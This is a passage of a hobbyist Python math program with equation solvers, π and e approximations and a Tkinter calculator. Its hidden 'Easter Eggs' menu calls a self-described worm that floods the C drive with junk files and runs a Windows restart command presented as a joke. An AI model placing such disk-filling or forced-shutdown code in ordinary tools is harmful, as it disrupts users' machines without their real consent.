                    print("The value of 'a' can't be 0. Retry?")
                    continue

                x = evalall(str(((-1) * (b / a))))
                print("x =", x)
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            elif (func == 2):  ## Linear Equations in 2 variables
                print("a₁x + b₁y + c₁ = 0")
                print("a₂x + b₂y + c₂ = 0")
                a1 = evalall(input("Enter 'a₁' :- "))
                b1 = evalall(input("Enter 'b₁' :- "))
                c1 = evalall(input("Enter 'c₁' :- "))
                a2 = evalall(input("Enter 'a₂' :- "))
                b2 = evalall(input("Enter 'b₂' :- "))
                c2 = evalall(input("Enter 'c₂' :- "))
                t1 = mt()
                gcd = m.gcd(a1*10000000000, a2*10000000000) / (10**10)
                lcm = a1 * a2 / gcd
                d1 = lcm / a1
                d2 = lcm / a2
                e1 = d1 * b1
                e2 = d2 * b2
                y = evalall(str((c2 - c1) / (e1 - e2)))
                x = evalall(str((-1) * (c1 + (b1 * y)) / a1))
                print("x =", x)
                print("y =", y)
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            elif (func == 3):       ## Quadratic Equations
                print("ax² + bx + c = 0")
                a = evalall(input("Enter 'a' :- "))
                b = evalall(input("Enter 'b' :- "))
                c = evalall(input("Enter 'c' :- "))
                t1 = mt()
                if (a == 0):
                    ## Equation is linear of the form: bx + c = 0
                    x = (-1) * c / b
                    print(f"x = {x}")
                    t2 = mt()
                    dt = t2 - t1
                    print(f"Answer delivered in {round(dt, 2)} seconds.")
                    continue
                Δ = (b ** 2) - (4 * a * c)
                x1 = evalall(str(((-b) + (Δ ** 0.5)) / (2 * a)))
                x2 = evalall(str((((-b) - (Δ ** 0.5)) / (2 * a))))
                print(f"α = {x1}\nβ = {x2}")
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            else:
                counter -= 1
                print("Option unavailable. Retry?")
                continue

        elif (choice == '5'):    ## Approximations of π
            print()
            counter += 1
            piChoice = int(evalall(input("Choose between the following approximations of π:\n1. Leibniz's Approximation of π\n2. Euler's Approximation of π\n3. Lord Broncker's 1st Approximation of π\n4. Lord Broncker's 2nd Approximation of π\n5. Wallis' Product for π\n6. Madhava's series for π\nEnter 1, 2, 3, 4, 5, or 6 :- ")))
            t1 = mt()
            
            if (piChoice == 1): ## Leibniz's Approximation of π; π = 3.1415928535897395
                n = evalall(input("Enter a no. to raise 'π' to it :- "))
                print(f"π^{round(n, 4)} =", piLeibniz(power=n))
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            elif (piChoice == 2):     ## Euler's Approximation of π; π = 3.1415925580959025
                n = evalall(input("Enter a no. to raise 'π' to it :- "))
                print(f"π^{round(n, 4)} =", piEuler(power=n))
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            elif (piChoice == 3):   ## Lord Broncker's 1st Approximation of π; π = 3.1415926217577352
                n = evalall(input("Enter a no. to raise 'π' to it :- "))
                print(f"π^{round(n, 4)} =", piLordBrouncker1(power=n))
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            elif (piChoice == 4):   ##Lord Broncker's 2nd Approximation of π; π = 3.141592462603859
                n = evalall(input("Enter a no. to raise 'π' to it :- "))
                print(f"π^{round(n, 4)} =", piLordBrouncker2(power=n))
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            elif (piChoice == 5):   ## Wallis' Product for π; π = 3.14159249649794
                n = evalall(input("Enter a no. to raise 'π' to it :- "))
                print(f"π^{round(n, 4)} =", piWallis(power=n))
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            elif (piChoice == 6):
            	n = evalall(input("Enter a no. to raise 'π' to it :- "))
            	print(f"π^{round(n, 4)} =", piMadhava(power=n))
            	t2 = mt()
            	dt = t2 - t1
            	print(f"Answer delivered in {round(dt, 2)} seconds.")
            	continue

            else:
                counter -= 1
                print("Option unavailable. Retry?")
                continue

        elif (choice == '6'):   ## Approximations of e; e = 2.7182818284590455
            print()
            counter += 1
            eChoice = int(evalall(input("Choose between the following evaluations of e using Taylor Series\n1. e\n2. eⁿ\nEnter 1 or 2 :- ")))
            t1 = mt()
                                
            if (eChoice == 1):
                print("e =", eTaylor())
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            elif (eChoice == 2):
                n = evalall(input("Enter the value of 'n' :- "))
                if (n == 1):
                    print("e =", eTaylor(power=1))
                    t2 = mt()
                    dt = t2 - t1
                    print(f"Answer delivered in {round(dt, 2)} seconds.")
                    continue
                elif (n == m.e):
                    print("e^e =", eTaylor(power=eTaylor()))
                    t2 = mt()
                    dt = t2 - t1
                    print(f"Answer delivered in {round(dt, 2)} seconds.")
                    continue
                elif (n == m.pi):
                    print("e^π =", eTaylor(power=m.pi))
                    t2 = mt()
                    dt = t2 - t1
                    print(f"Answer delivered in {round(dt, 2)} seconds.")
                    continue
                print(f"e^{round(n, 4)} =", eTaylor(power=n))
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue
                
            else:
                counter -= 1
                print("Option unavailable. Retry?")
                continue

        elif (choice == '7'):   ## Math Calculator
            """
            Python program to create a simple GUI 
            calculator using Tkinter 
            """
            counter += 1
            t1 = mt()

            ## Create a GUI window 
            calculatorGUI = Tk()

            ## Set the icon of the app
            calculatorGUI.iconbitmap('Calculator_Icon.ico')

            ## Set the background colour of GUI window 
            calculatorGUI.configure(background="#000000") 

            ## Set the title of GUI window
            calculatorGUI.title("Mathematical-Expression-Value-Evaluating-Machinator!")

            ## Set the configuration of GUI window 
            calculatorGUI.geometry("1320x675")

            ## StringVar() is the variable class
            ## We create an instance of this class
            equation = StringVar()

            ## Create the text entry box for showing the expression
            expression_field = Entry(calculatorGUI,
            textvariable=equation,
            font="MathJax_Main-Regular 30",
            justify='center',
            relief=FLAT,
            bg='#000000',
            fg='#FFFFFF')

            ## Grid method is used for placing the widgets at respective positions in table like structure
            expression_field.grid(column=1, columnspan=100, ipadx=200, ipady=4) 

            equation.set('') 

            ## Create HoverButtons and place at a particular location inside the root window `calculatorGUI`. When user press the button, the command or function affiliated to that button is executed
            button1 = HoverButton(calculatorGUI, text=' \n 1 \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press(1), height=1, width=7).grid(row=6, column=1)

            button2 = HoverButton(calculatorGUI, text=' \n 2 \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press(2), height=1, width=7).grid(row=6, column=2) 

            button3 = HoverButton(calculatorGUI, text=' \n 3 \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press(3), height=1, width=7).grid(row=6, column=3) 

            button4 = HoverButton(calculatorGUI, text=' \n 4 \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press(4), height=1, width=7).grid(row=5, column=1) 

            button5 = HoverButton(calculatorGUI, text=' \n 5 \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press(5), height=1, width=7).grid(row=5, column=2) 

            button6 = HoverButton(calculatorGUI, text=' \n 6 \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press(6), height=1, width=7).grid(row=5, column=3) 

            button7 = HoverButton(calculatorGUI, text=' \n 7 \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press(7), height=1, width=7).grid(row=4, column=1) 

            button8 = HoverButton(calculatorGUI, text=' \n 8 \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press(8), height=1, width=7).grid(row=4, column=2) 

            button9 = HoverButton(calculatorGUI, text=' \n 9 \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press(9), height=1, width=7).grid(row=4, column=3) 

            button0 = HoverButton(calculatorGUI, text=' \n 0 \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press(0), height=1, width=7).grid(row=7, column=1) 

            plus = HoverButton(calculatorGUI, text=' \n + \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28, 'bold'], command=lambda: press(" + "), height=1, width=7).grid(row=7, column=4) 

            minus = HoverButton(calculatorGUI, text=' \n - \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28, 'bold'], command=lambda: press(" - "), height=1, width=7).grid(row=6, column=4) 

            multiply = HoverButton(calculatorGUI, text=' \n × \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28, 'bold'], command=lambda: press(" × "), height=1, width=7).grid(row=5, column=4) 

            divide = HoverButton(calculatorGUI, text=' \n ÷ \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28, 'bold'], command=lambda: press(" ÷ "), height=1, width=7).grid(row=4, column=4) 

            equal = HoverButton(calculatorGUI, text=' \n = \n ', fg='#000000', bg='#0000FF', relief=FLAT, activebackground='#0064FF', activeforeground='#FFFFFF', font=['CircularStd', 28, 'bold'], command=evaluate, height=1, width=7).grid(row=7, column=3) 

            clear = HoverButton(calculatorGUI, text=' C ', fg='#000000', bg='#FF0000', relief=FLAT, activeforeground='#FFFFFF', activebackground='#FF1111', font=['CircularStd', 26], command=clear, height=1, width=7).grid(row=4, column=6)

            parentheses1 = HoverButton(calculatorGUI, text=' \n ( \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press("("), height=1, width=7).grid(row=7, column=5)

            parentheses2 = HoverButton(calculatorGUI, text=' \n ) \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press(")"), height=1, width=7).grid(row=7, column=6)

            power = HoverButton(calculatorGUI, text=' \n xⁿ \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press("^"), height=1, width=7).grid(row=5, column=5)

            ι = HoverButton(calculatorGUI, text=' \n ι \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press("ι"), height=1, width=7).grid(row=5, column=6)

            e = HoverButton(calculatorGUI, text=' \n e \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press("e"), height=1, width=7).grid(row=6, column=5)

            π = HoverButton(calculatorGUI, text=' \n π \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press("π"), height=1, width=7).grid(row=6, column=6)

            decimal = HoverButton(calculatorGUI, text=' \n . \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press("."), height=1, width=7).grid(row=7, column=2)

            delete = HoverButton(calculatorGUI, text=' \n ⪻ \n ', fg='#FF0000', bg='black', relief=FLAT, activeforeground='#FFFFFF', activebackground='#FF0000', font=['CircularStd', 28], command=delete, height=1, width=7).grid(row=4, column=5)

            sin = HoverButton(calculatorGUI, text=' \n sin(x) \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press("sin("), height=1, width=7).grid(row=8, column=1)

            cos = HoverButton(calculatorGUI, text=' \n cos(x) \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press("cos("), height=1, width=7).grid(row=8, column=2)

            tan = HoverButton(calculatorGUI, text=' \n tan(x) \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press("tan("), height=1, width=7).grid(row=8, column=3)

            cosec = HoverButton(calculatorGUI, text=' \n cosec(x) \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press("csc("), height=1, width=7).grid(row=8, column=4)

            sec = HoverButton(calculatorGUI, text=' \n sec(x) \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press("sec("), height=1, width=7).grid(row=8, column=5)

            cot = HoverButton(calculatorGUI, text=' \n cot(x) \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press("cot("), height=1, width=7).grid(row=8, column=6)

            ln = HoverButton(calculatorGUI, text=' \n ln(x) \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press("ln("), height=1, width=7).grid(row=9, column=1)

            log = HoverButton(calculatorGUI, text=' \n log(x) \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press("log("), height=1, width=7).grid(row=9, column=2)

            log2 = HoverButton(calculatorGUI, text=' \n log2(x) \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press("log2("), height=1, width=7).grid(row=9, column=3)

            sqrt = HoverButton(calculatorGUI, text=' \n √x \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press("√("), height=1, width=7).grid(row=9, column=4)

            fact = HoverButton(calculatorGUI, text=' \n x! \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=lambda: press("fact("), height=1, width=7).grid(row=9, column=5)

            baseCounter = 0
            baseConverter = HoverButton(calculatorGUI, text=' \n 10 ↔ 2 \n ', fg='#0064FF', bg='black', relief=FLAT, activebackground='#151519', activeforeground='#1DB954', font=['CircularStd', 28], command=baseConvertingCalculator, height=1, width=7).grid(row=9, column=6)

            magicList = [epii, showe, showPi, showi, epowe, pipowpi, epowpi, pipowe, ipowi, ipowe, ipowpi, epowi, pipowi, datetime]
            magicButton = HoverButton(calculatorGUI, text='The Magic HoverButton!', relief=FLAT, fg='black', bg='black', activeforeground='black', activebackground='black', font=['CircularStd', 28], command=ch(magicList), height=2, width=7).grid(row=0, column=0)

            ## A protocol to check if the cursor clicked on the exit `X` button
            calculatorGUI.protocol("WM_DELETE_WINDOW", onClosing)

            ## Start the GUI
            calculatorGUI.mainloop()

            
        elif (Choice.lower() == userName.lower()):      ## Easter Eggs
            print()
            if (easterCounter == 0):
                print("Ah, so you've found the easter eggs, eh? Nice!")
            easterChoice = int(evalall(input("Choose between these Easter Eggs:\n1. Worm\n2. Space launcher\n3. Self-destruct sequence\n4. Shut down\n5. COOL!!!\nEnter 1, 2, 3, 4, or 5 :- ")))
            if (easterChoice == 1): ## 1. Worm
                print()
                easterCounter += 1
                ## This is a WORM (MALWARE) program made by AVINASH

                ##<IMPORTANT NOTICE>##
                "'THIS IS A PART OF A PROJECT (BY `AVINASH`) AND IS A BASIC MALWARE (`WORM`) AND SHOULD BE USED UNDER ADULT SUPERVSION. ANY DAMAGE CAUSED SHALL NOT BE BORNE BY THE AUTHOR.'"
                ##</IMPORTANT NOTICE>##

                print()
                print("-------------------------------------------- *** WARNING *** -------------------------------------------\nExecute the program under self-guidance and control ONLY. Any damaged caused to you shall NOT be bearable by the creator of this program in any way possible.")
                print()
        
                ## Program Details
                print("The files will be named automatically by the program as 'ImportantFiles_<x>.txt', where 'x' is the file number in the `C` drive.")

                print()
                print("——————————————————————————————————————— ONLY UNDER ADULT SUPERVISION ———————————————————————————————————\nEnter nothing to create Infinite Files with extremely high no. of Lines.")
                print()
                
                ## Input: No. of empty files to be created
                file_count = input("Enter no. of Empty Files to be created :- ")

                ## Input: No. of empty lines to be created
                line_count = input("Enter no. of Empty Lines to be added to the above File :- ")

                if ((evalall(line_count) < 0) or (evalall(file_count) < 0)):    ## Negative numbers can't be taken as files/lines/both can't be less than `0`
                    print("The no. of files/lines/both can't be negative. Retry?")
                    counter -= 1
                    continue

                ## To check if User entered a Whole Number or not in `file_count`
                file_len = 0
                for x in file_count:
                    if (x.isdigit()):
                        file_len += 1
                
                ## To check if User entered a Whole Number or not in `line_count`
                line_len = 0
                for x in line_count:
                    if (x.isdigit()):
                        line_len += 1
                
                if ((file_count == '') and (line_count == '')):
                    print("Trust me, you don't wanna do this. Try to quit this program NOW!")
                    choice1 = input("Yes (Y) / No (N) ---> ")
                    if (choice1.lower() == 'y'):
                        print("This is your last warning! Further consequences will not be tolerated by the creator. So, PROCEED ON YOUR OWN.")
                        choice2 = input("Yes (Y) / No (N) ---> ")
                        if (choice2.lower() == 'y'):  ## DESTRUCTION: 100
                            print("So you've chosen death, huh?")
                            wormInfiniteFileCreator()
                        else:
                            print("You just saved your own life!")
                            easterCounter -= 1
                            continue
                    else:
                        print("Nice decision!")
                        easterCounter -= 1
                        continue
                if ((len(file_count) != 0) and (len(line_count) != 0)):      
                   if ((file_len == len(file_count)) and (line_len == len(line_count))):    ## Calling function 'wormFiniteFileCreator(fileCount=int(file_count), lineCount=int(line_count))'
                        wormFiniteFileCreator(fileCount=int(evalall(file_count)), lineCount=int(evalall(line_count)))
                
                else:
                    print("Only Whole Numbers are taken. Retry?")
                    continue
                continue

            elif (easterChoice == 2):   ## 2. Space launcher
                easterCounter += 1
                print("Enter anything below to launch into space.")
                print("\n\n\n\n\n\t\t\t\t\t")
                launcher = input()
                for x in range(0, 100, 1):
                    print("\n"*10)
                print("Lost In Space...")
                continue

            elif (easterChoice == 3):   ## 3. Self-destruct sequence: Activated
                easterCounter += 1
                time = int(evalall(input("Enter the time before this device destroys itself :- ")))
                print("Destruction in:")
                for x in range(1, time+1, 1):
                    s(1)
                    print(f"T-minus {time-x} seconds")
                s(0.5)
                print("Kaboom!!!")
                print("Just kiddin', I'll just restart your PC.")
                s(2)
                system("shutdown /r /t 1")
                continue

            elif (easterChoice == 4):   ## 4. Shut Down
                easterCounter += 1
                shutdown = input("Do you want to shut your PC down?\n")
                if (shutdown.lower() == 'y'):   ## User wants to shut his/her PC down
                    print("And.. there you go!")
                    s(0.5)
                    system("SlideToShutDown")
                    system("shutdown /s /t 1")
                else:
                    print("Woah there, you could've simply switched on your PC...")
                continue

            elif (easterChoice == 5):   ## 5. COOL!!!
                easterCounter += 1
                print()
                s(0.05)
                print("##########################################################################")
                s(0.05)
                print("#                                                                        #")
                s(0.05)
                print("#                                                                        #")
                s(0.05)
                print("#      ----------  /----------\   /----------\   |-|           ! ! !     #")
                s(0.05)
                print("#     / ---------  | --------  |  | --------  |  | |           ! ! !     #")
                s(0.05)
                print("#     | |          | |       | |  | |       | |  | |           ! ! !     #")
                s(0.05)
                print("#     | |          | |       | |  | |       | |  | |           ! ! !     #")
                s(0.05)
                print("#     | |          | |       | |  | |       | |  | |           ! ! !     #")
                s(0.05)
                print("#     | |          | |       | |  | |       | |  | |           ! ! !     #")
                s(0.05)
                print("#     | |          | |       | |  | |       | |  | |           ! ! !     #")
                s(0.05)
                print("#     | |          | |       | |  | |       | |  | |           ! ! !     #")
                s(0.05)
                print("#     | ---------  | --------  |  | --------  |  | |_________  ! ! !     #")
                s(0.05)
                print("#     \__________  \__________/   \__________/   |__________|  O O O     #")
                s(0.05)
                print("#                                                                        #")
                s(0.05)
                print("#                                                                        #")
                s(0.05)
                print("##########################################################################")
                s(0.05)
                continue
            continue

        else:   ## Wrong/unavailable choice/option
            print()
            print("Option unavailable. Retry?")
            continue                


        print()


exit()


##################################################
###"""##### ----- End Of Program ----- #####"""###
##################################################
